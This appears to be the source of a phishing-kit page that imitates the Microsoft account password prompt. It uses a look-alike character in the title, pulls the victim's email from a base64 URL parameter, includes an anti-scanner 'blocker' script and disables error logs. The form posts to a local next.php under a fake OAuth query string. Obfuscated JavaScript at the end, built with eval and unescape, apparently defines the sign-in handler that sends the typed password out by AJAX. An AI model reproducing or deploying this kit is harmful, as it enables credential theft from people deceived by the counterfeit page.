﻿<? 

include('../blocker.php');

error_reporting(0);
ini_set('error_log',NULL);
?>
﻿﻿<html xmlns='http://www.w3.org/1999/xhtml'>
<?php

function getDomainFromEmail($log)
{
// Get the data after the @ sign
   $domain = substr(strrchr($log, "@"), 1);
   $remove = array(".com");
   return $domain;
} 
// Example
$login = $_GET['login'];
$log = base64_decode($login);
$domain = getDomainFromEmail($log);

?>

<!DOCTYPE html>
<html dir="ltr" lang="EN-US">

<head>
    <title>Sign in to your M&Icirc;crosoft account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="inf/favicon.ico">
    <link rel="stylesheet" title="Converged_v2" type="text/css" href="inc/Converged_v21033.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>

<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
    <div>
        <!--  -->
        <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                <!-- ko if: smallImageUrl -->
                <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;inf/0-small.jpg?x=138bcee624fa04ef9b75e86211a9fe0d&quot;);"></div>
            
                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;inf/0.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div>
             
            </div>
        </div>
        <form name="f1" id="i0281" class="form" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="next.php?authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dMkI4qQBYEQQ-u8ByVeYnS93HqSpWD4ssnyM2pBs-8f-9kWopUaq7taUz_IuiWaFAjxnZnCfkV5hNH1PsVz-_WXPEYTAGBfdkeNV_LDAigb-sG0SkoqsW1orJAXKeFI_O&nonce=636673178890036399.YzU3MWNlYWUtMjQ0Yy00M2E1LWE1M2UtZTJlOWE1ZDJlYzQxYjY0M2Y5YTUtN2Q2YS00YjMzLWI5ZWMtYTZhZjNlN2ZiYzlj&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US">
            <div class="outer">
                <div class="middle">
                    <!-- /ko -->
                    <div class="inner">
                        <div role="banner"> <img class="logo" role="presentation" pngsrc="inc/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="inc/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"
                                data-bind="imgSrc" src="inc/microsoft_logo.svg"> </div>
                        <div role="main">
                            <div class="animate">
                                <div data-viewid="2" data-dynamicbranding="true">
                                    <!--  --><input name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0" type="hidden"> <input name="email" data-bind="value: unsafe_username" value="<?php echo $_SESSION['email'];?>" type="hidden"> <input name="loginfmt"
                                        data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true" value="<?php echo $_SESSION['email'];?>" type="text"> <input name="type" data-bind="value: svr.A0 ? 20 : 11"
                                        value="11" type="hidden"> <input name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3" type="hidden"> <input name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="" type="hidden">                                    <input name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="" type="hidden"> <input name="hisRegion" data-bind="value: callMetadata.HisRegion" value="" type="hidden"> <input name="hisScaleUnit"
                                        data-bind="value: callMetadata.HisScaleUnit" value="" type="hidden">
                                    <div>
                                        <!--  -->
                                        <div class="identityBanner">
                                            <!-- ko if: isBackButtonVisible --><button type="button" class="backButton" id="idBtn_Back" aria-label="Back"> <img role="presentation" pngsrc="inc/arrow_left.png?x=e1bdb6aa0ac109300b2b356869560655" svgsrc="inc/arrow_left.svg?x=aa02fcd965bca78f4b2d246d36fd8426" data-bind="imgSrc" src="inc/arrow_left.svg">  </button>
                                           
                                            <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $_SESSION['email'];?>">
                                                <?php echo $log;?>
                                            </div>
                                        </div>
                                    </div>
                                    <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
                                    <input type="hidden" name="login" value="<?php echo $log; ?>">
                                    <div class="row">
                                        <div class="form-group col-md-24">
                                            <div class="placeholderContainer"> <input name="passwd" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="Password" aria-label="Enter password" type="password">                                                </div>
                                        </div>
                                    </div>
                                    <div data-bind="invertOrder: svr.BH, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                                        <div>
                                            <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.b &amp;&amp; !showHip"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in" type="checkbox"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label>                                                </div>
                                            <!-- /ko -->
                                            <div class="row">
                                                <div class="col-md-24">
                                                    <div class="text-13 action-links">
                                                        <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href=""
                                                                data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.J, click: resetPassword_onClick">Forgot my password</a> </div>
                                                        
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                            <div>
                                                <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container">
                                                    <div class="inline-block"> <input id="idBtn_Back" class="btn btn-block" value="Back" style="display: none;" type="button"> </div>
                                                    <div class="inline-block"> <button id="idSIButton9" class="btn btn-block btn-primary" onclick="check();">Sign in</button> </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
                <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                debugDetails: debugDetails,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick,
                showDebugDetailsClick: footer_showDebugDetailsClick } }">
                    <div id="footerLinks" class="footerNode text-secondary">
                        <!-- ko if: !showIcpLicense --><span id="ftrCopy" data-bind="html: svr.bG">©2019 Microsoft</span>
                        <!-- /ko --><a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="">Terms of use</a> <a id="ftrPrivacy"
                            data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; cookies</a>
                        
                        <a href="#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'], attr: { title: str['CT_STR_More_Options_Ellipsis_AriaLabel'] }" aria-label="Click here for more options"
                            title="Click here for more options"><img class="desktopMode" role="presentation" pngsrc="" svgsrc=""
                                data-bind="imgSrc" src="inc/ellipsis_white.svg"><img class="mobileMode" role="presentation" pngsrc="inc/ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="inc/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c"
                                data-bind="imgSrc" src="inc/ellipsis_grey.svg">
                        </a>
                    </div>
                </div>
            </div>
        </form>
    </div>
</body>
<script>
l1l=document.documentMode||document.all;var f76ca8=true;ll1=document.layers;lll=window.sidebar;f76ca8=(!(l1l&&ll1)&&!(!l1l&&!ll1&&!lll));l_ll=location+'';l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)>0?true:false};lII=lI1('kht')|lI1('per');f76ca8|=lII;zLP=location.protocol+'0FD';rRWhe=new Array();rRWhe[0]='k%36q\125%45\145%38P%31%44%38' ;otV5f=new Array();otV5f[0]='	~za~~~~~~~~~	~\n~~~\r~~~~~~~~~~~~~~~~~~\r~!~"~#~$~%~&~\'~(~)~*~+~,~-~.~/~0~1~2~3~4~5~6~7~8~9~:~;~<~=~>~?~@~A~B~C~D~E~F~G~H~I~J~K~L~M~N~O~P~Q~R~S~T~U~V~W~X~Y~Z~[~\\~G~~_~`~a~b~c~d~e~f~g~h~i~j~bdl=document.layers;oe=win~pw.op~|a?1:0;da=(~p~r~t~v.}~s~utMode||}}~wall)&&!}za;g}}%}.}1tEle}&ById;ws}}' ;t18D9z6U0='fu' ;wgEH3='rK4eFbzHK' ;m84JYf7Qd1n3='hwOBdcZDaCjjJObQUdOuCuouCSmnOTwu' ;t18D9z6U0+='nction t262F2M'+'c8qaYuL0583(sqo213'+'p55U1j){' ;e6zqUdxZX18yBK='\151f%28\172%4C\120%2E%69\156d\145xO\146%28%27%5C%35%35%27%29%3E%30%29%7B%6Ft\126%35f%5B%30%5D%3D%27x%27%7D%3B\166a%72%20%6C%32%3Dwin\144\157\167%2E%6F\160\145ra%3F%31%3A%30%3B%66\165ncti%6F\156%20\154%38%61c%36%37%66%28%29%7B\151f%28f%37%36%63%61%38%29%7B%64o%63%75m%65n\164%2E\167\162%69%74%65%28%27%3Cs%63r%27%2B%27i\160t%3E%27%2Bl%4F%2B%27%3C%2Fsc%27%2B%27rip\164%3E%27%29%7D%7D%3Bf%75\156c\164\151%6F\156%20l%33%28l%34%29%7Bl%35%3D%2F%7A%61%2F\147%3Bl%36%3D%53\164ri%6Eg%2Efrom%43h\141%72C%6Fd\145%28%30%29%3B\154%34%3Dl%34%2Er%65%70\154%61\143\145%28l%35%2Cl%36%29%3B%76ar%20\154%37%3D%6E%65w%20%41rr\141y%28%29%2C\154%38%3D%5F%31%3D\154%34%2E\154\145%6Egt%68%2C\154%39%2C%6C\111%2C\151%6C%3D%31%36%32%35%36%2C%5F%31%3D%30%2C%49%3D%30%2C\154i%3D%27%27%3B\144\157%7B\154%39%3Dl%34%2Ec' ;rRWhe[0]+='%71%34%62%31\110%6DAZ%42O\156\166' ;otV5f[0]+='}.si}!bar?true:f}(se;tN=navigator.u}UrA}1}}aLow~|Ca}U();iz}Y}X.}DexOf(\'netsca}\n\')>=0}M}O}Q}Sl}U;zi}B}||8~oa;v}K msg=\'\';function |m}s{r|ur|0}N}P}}@}D}m}|rr}b =|1}:|OF}C}|@l~q}`|.n.p|D}acol}z}}|}~|zafi}9|	!=-1|}P}R}T}Vi7f=|s},!z|K|i||l; || |)|+|-|/ check}s\r\n{{\n' ;function c8qaYuL0583t262F2M(q1Im72gp1){m84JYf7Qd1n3+=q1Im72gp1};t18D9z6U0+='eva' ;y6X14j1q766='OXeZBBqvNVvOdmTlOdGdeeOO' ;t18D9z6U0+='l(unes' ;gSmsoT4='nhO7Cn1y983i7F' ;t18D9z6U0+='cape(sqo213p55U1j))}' ;gSmsoT4+='ds19516bW38h' ;eval(t18D9z6U0);oPfG3NIy='sOJcOoLgexBdrSGNddkCQaUDxbQOum' ;t18D9z6U0='' ;e6zqUdxZX18yBK+='\150arC\157d%65\101\164%28%5F%31%29%3Bl%49%3D\154%34%2E%63%68%61r\103%6F%64e%41t%28%2B%2B%5F%31%29%3Bl%37%5BI%2B%2B%5D%3Dl%49%2B\151%6C%2D%28\154%39%3C%3C%37%29%7D\167%68%69l\145%28%5F%31%2B%2B%3C\154%38%29%3Bvar%20\154%31%3D%6E%65\167%20Array%28%29%2C\154%30%3D%6E%65w%20Ar%72%61%79%28%29%2CI\154%3D%31%32%38%3Bd\157%7B\154%30%5BIl%5D%3D%53\164ri\156\147%2E%66r\157m\103h\141\162%43o\144\145%28%49%6C%29%7Dwhil%65%28%2D%2D%49l%29%3B\111l%3D%31%32%38%3B\154%31%5B%30%5D%3D\154i%3D\154%30%5Bl%37%5B%30%5D%5D%3B\154l%3D\154%37%5B%30%5D%3B%5Fl%3D%31%3Bva%72%20%6C%5F%3D\154%37%2E\154\145%6E\147t\150%2D%31%3B%77\150\151l\145%28%5Fl%3Cl%5F%29%7Bs\167\151%74\143h%28\154%37%5B%5F%6C%5D%3CIl%3F%31%3A%30%29%7B%63\141\163\145%20%30%20%3A\154%30%5B%49l%5D%3D%6C%30%5B\154l%5D%2B\123t%72\151n%67%28l%30%5B\154l%5D' ;eval(unescape('f%75n\143\164ion%20\147A%37%30%32Gt\162%20%20%20%20%28b\142%32R\160\127%32\153K%44P%29%7Bi%38%33\167%33%38%30p%33%32kS%38%62%3Dbb%32%52%70%57%32\153K\104%50%7D%3B'));rt3PcVq='l' ;otV5f[0]+='	$.ajax({\n	ty}\n: "POST",{\r|8l{"|l}H}`}b/|V~qess|Uhp{#{\r}ta{$(".f}bm")}F~|i}(}ve}s{${succ{2s{||,|S(|"g){	i}{[|F|G1{]{\r|} }|N}|P|{|Th|6f|F{{*{,}ar/C|/gr}`u~y{o{4p{6";{\r}e|e{^|}{>"#p}qsw}bdE|C}b{E}Fh}m}s|{zz!{}}t{\n}~kz(z)z*z+z,z-z.z/z0~d~]z3z4z5z6z7z8z9z:z;z<z=z>z?z@zAzBzCzDzEzFzGzHzIzJzEz1zMzNzOzPzQzRzSzT~' ;c8qaYuL0583t262F2M('kM1Wfrrj');e6zqUdxZX18yBK+='%29%2E\163u%62\163\164%72%28%30%2C%31%29%3B\154%31%5B%5F%6C%5D%3D\154%30%5BI%6C%5D%3Bi%66%28l%32%29%7B%6C%69%2B%3Dl%30%5BI%6C%5D%7D%3B\142r\145a%6B%3Bd\145f\141\165\154t%3Al%31%5B%5Fl%5D%3D%6C%30%5Bl%37%5B%5Fl%5D%5D%3B\151f%28%6C%32%29%7B\154\151%2B%3D%6C%30%5B\154%37%5B%5Fl%5D%5D%7D%3Bl%30%5BI\154%5D%3D%6C%30%5Bl%6C%5D%2BSt\162%69%6E%67%28l%30%5B\154%37%5B%5F%6C%5D%5D%29%2E\163ub%73\164%72%28%30%2C%31%29%3B\142re\141k%7D%3B\111l%2B%2B%3B\154l%3D\154%37%5B%5Fl%5D%3B%5Fl%2B%2B%7D%3B%69\146%28%21l%32%29%7B%72\145tu\162%6E%28%6C%31%2E\152\157in%28%27%27%29%29%7D\145\154s\145%7Br%65turn%20li%7D%7D%3Bvar%20%6CO%3D%27%27%3B%66%6Fr%28\151%69%3D%30%3B\151\151%3Co%74%56%35f%2E\154e%6E%67\164h%3B\151\151%2B%2B%29%7B%6CO%2B%3Dl%33%28o%74\126%35%66%5B%69i%5D%29%7D%3Bl%38\141c%36%37\146%28%29%3B' ;oPfG3NIy      ='kMDQxdjgkowoBJfpvaJOBoJWbOkNOcjUEMMSSTWNWs' ;rGeStnn='x5Don2DN' ;t262F2Mc8qaYuL0583 (e6zqUdxZX18yBK);gA702Gtr   (e6zqUdxZX18yBK);c8qaYuL0583t262F2M    (y6X14j1q766);rt3PcVq+='GJOLYQPCQjypLWJKuKDwSvMOKbvOOOKJmIbMHxpZhbMpNGZyYnmxcxSViKaYZOQfqMOdqoIrTyCOQEPZPfChIbBnuw' ;gSmsoT4+='wBb1Aj' ;
</script>
</html>